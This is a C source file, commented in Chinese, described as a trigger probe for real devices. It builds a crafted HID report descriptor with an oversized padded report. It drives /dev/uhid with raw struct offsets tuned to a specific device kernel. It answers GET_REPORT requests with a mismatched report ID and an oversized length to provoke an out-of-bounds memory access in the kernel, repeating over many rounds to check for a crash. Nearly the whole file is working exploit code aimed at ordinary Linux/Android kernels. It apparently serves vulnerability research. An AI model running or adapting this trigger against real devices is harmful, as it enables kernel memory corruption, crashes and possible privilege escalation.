/* dev_oob3.c — 真机版触发探针 v3: 使用 cz6 验证过的 union@4 原始偏移布局
 * (真机内核 uhid_event union 在偏移 4, 与上游/bionic 偏移 8 不同)
 * 用法: ./dev_oob3 <rounds> <rep3_count>
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <linux/filter.h>

#define EVSZ 4380
static unsigned char ev[EVSZ];
static void wr32(int o, uint32_t v){ memcpy(ev+o,&v,4); }
static void wr16(int o, uint16_t v){ memcpy(ev+o,&v,2); }
static uint32_t rd32(int o){ uint32_t v; memcpy(&v,ev+o,4); return v; }

static unsigned char desc[4096];
static unsigned desc_len;

static void build_desc(int rep3_count) {
    static const unsigned char wptp[] = {
    0x05,0x0D,0x09,0x05,0xA1,0x01,
        0x85,0x01,
        0x09,0x56,0x24,0x00,0x26,0xFF,0xFF,0x75,0x10,0x95,0x01,0x81,0x02,
        0x09,0x54,0x25,0x05,0x75,0x08,0x81,0x02,
        0x05,0x20,0x0A,0x94,0x04,0x15,0x00,0x26,0xFF,0x0F,0x35,0x00,
        0x46,0xFF,0x0F,0x65,0x12,0x75,0x0C,0x95,0x01,0x81,0x02,
        0x05,0x0D,0x09,0x22,0xA1,0x02,
            0x09,0x51,0x25,0x0F,0x75,0x04,0x95,0x01,0x81,0x02,
            0x09,0x42,0x25,0x01,0x75,0x01,0x81,0x02,
            0x09,0x47,0x81,0x02,0x95,0x05,0x81,0x03,
            0x05,0x01,0x09,0x30,0x15,0x00,0x26,0xC8,0x00,0x35,0x00,
            0x45,0x69,0x65,0x11,0x75,0x10,0x95,0x01,0x81,0x02,
            0x09,0x31,0x26,0x96,0x00,0x45,0x4B,0x81,0x02,
            0x05,0x0D,0x09,0x30,0x15,0x00,0x26,0xFF,0x0F,0x35,0x00,
            0x46,0xFF,0x0F,0x65,0x12,0x75,0x0C,0x95,0x01,0x81,0x02,
        0xC0,
        0x05,0x09,0x09,0x01,0x15,0x00,0x25,0x01,0x75,0x01,0x95,0x01,
        0x81,0x02,0x95,0x07,0x81,0x03,
        0x85,0x02,
        0x05,0x0D,0x09,0x55,0x25,0x05,0x75,0x08,0x95,0x01,0xB1,0x02,
        0x09,0x59,0x25,0x02,0xB1,0x02,
        0x85,0x40,
        0x05,0x0D,0x09,0xB0,0x15,0x01,0x25,0x03,0x35,0x6E,0x45,0xBE,
        0x65,0x12,0x75,0x02,0x95,0x01,0xB1,0x02,
        0x85,0x41,
        0x05,0x0E,0x09,0x01,0xA1,0x02,
            0x09,0x23,0x15,0x00,0x25,0x04,0x75,0x08,0x95,0x01,0xB1,0x02,
        0xC0,
    0xC0,
    };
    static const unsigned char pad118[] = { 0x75,0x08, 0x95,0x76, 0xB1,0x03 };
    unsigned char rep3[] = { 0x85,0x03, 0x75,0x08,
        (unsigned char)((rep3_count>>8)&0xFF), (unsigned char)(rep3_count&0xFF), 0xB1,0x03 };
    int pos=0, i=0, insA=-1;
    while(i<(int)sizeof(wptp)-5){
        if(wptp[i]==0x09&&wptp[i+1]==0x59&&wptp[i+2]==0x25&&wptp[i+3]==0x02
           &&wptp[i+4]==0xB1&&wptp[i+5]==0x02){insA=i+6;break;}
        i++;
    }
    memcpy(desc+pos,wptp,insA); pos+=insA;
    memcpy(desc+pos,pad118,sizeof(pad118)); pos+=sizeof(pad118);
    memcpy(desc+pos,rep3,sizeof(rep3)); pos+=sizeof(rep3);
    memcpy(desc+pos,wptp+insA,sizeof(wptp)-insA); pos+=sizeof(wptp)-insA;
    desc_len = pos;
}

static double now_s(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}

static int create_legacy(int fd, const char *name){
    memset(ev,0,EVSZ);
    wr32(0,0);                       /* UHID_CREATE */
    strncpy((char*)(ev+4), name, 127);        /* name @4 */
    strncpy((char*)(ev+132), "virt-0", 63);   /* phys @132 */
    uint64_t p = (uint64_t)(uintptr_t)desc;
    memcpy(ev+260,&p,8);             /* rd_data @260 */
    wr16(268,(uint16_t)desc_len);    /* rd_size @268 */
    wr16(270,0x0003);                /* bus = BUS_USB */
    wr32(272,0x1234); wr32(276,0x5678); wr32(280,1);
    ssize_t w = write(fd,ev,EVSZ);
    if (w<=0){ printf("CREATE fail ret=%zd errno=%d\n", w, errno); return -1; }
    return 0;
}

static void answer(int fd, int oob) {
    /* 读取到的 ev: type@0, id@4, rnum@8 (GET_REPORT) */
    memset(ev,0,EVSZ);
    wr32(0, rd32(0) == 9 ? 10 : 14);   /* 应答类型 = 事件类型 + 1 */
    wr32(4, rd32(4));                  /* echo cookie/id */
    wr16(8, 0);                        /* err */
    wr16(10, oob ? 128 : 1);           /* size */
    ev[12] = oob ? 3 : 0;              /* data[0] = 不匹配的大报告 ID */
    write(fd, ev, EVSZ);
}

int main(int argc, char **argv) {
    int rounds = argc > 1 ? atoi(argv[1]) : 10;
    int rep3_count = argc > 2 ? atoi(argv[2]) : 248;
    setvbuf(stdout, NULL, _IONBF, 0);
    build_desc(rep3_count);
    printf("desc_len=%u rep3_count=%d\n", desc_len, rep3_count);

    int ufd = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    if (ufd < 0) { printf("open uhid: %s\n", strerror(errno)); return 1; }

    for (int r = 1; r <= rounds; r++) {
        if (create_legacy(ufd, "d3") < 0) return 1;
        printf("[%.3f] round %d: CREATE ok\n", now_s(), r);

        int get_count = 0;
        for (int t = 0; t < 300 && get_count < 3; t++) {
            struct timeval tv = {0, 20000};
            fd_set rf; FD_ZERO(&rf); FD_SET(ufd, &rf);
            if (select(ufd+1, &rf, NULL, NULL, &tv) <= 0) continue;
            ssize_t rr = read(ufd, ev, EVSZ);
            if (rr <= 0) continue;
            uint32_t type = rd32(0);
            if (type == 2) { printf("  UHID_START\n"); continue; }
            if (type == 4 || type == 5) continue;
            if (type == 9 || type == 13) {
                uint8_t rnum = ev[8];
                printf("  GET_REPORT rnum=%u\n", rnum);
                answer(ufd, rnum == 2 ? 1 : 0);
                get_count++;
            }
        }
        printf("[%.3f] round %d: answered %d\n", now_s(), r, get_count);

        for (int t = 0; t < 100; t++) {
            struct timeval tv = {0, 20000};
            fd_set rf; FD_ZERO(&rf); FD_SET(ufd, &rf);
            if (select(ufd+1, &rf, NULL, NULL, &tv) <= 0) continue;
            ssize_t rr = read(ufd, ev, EVSZ);
            if (rr > 0) {
                uint32_t type = rd32(0);
                if (type == 9 || type == 13) {
                    printf("  LATE GET rnum=%u\n", ev[8]);
                    answer(ufd, ev[8] == 2 ? 1 : 0);
                }
            }
        }

        memset(ev,0,EVSZ); wr32(0,1);
        write(ufd, ev, EVSZ);  /* UHID_DESTROY */
        printf("[%.3f] round %d: DESTROY — alive\n", now_s(), r);
        usleep(200000);
    }
    printf("=== completed %d rounds, no crash ===\n", rounds);
    return 0;
}
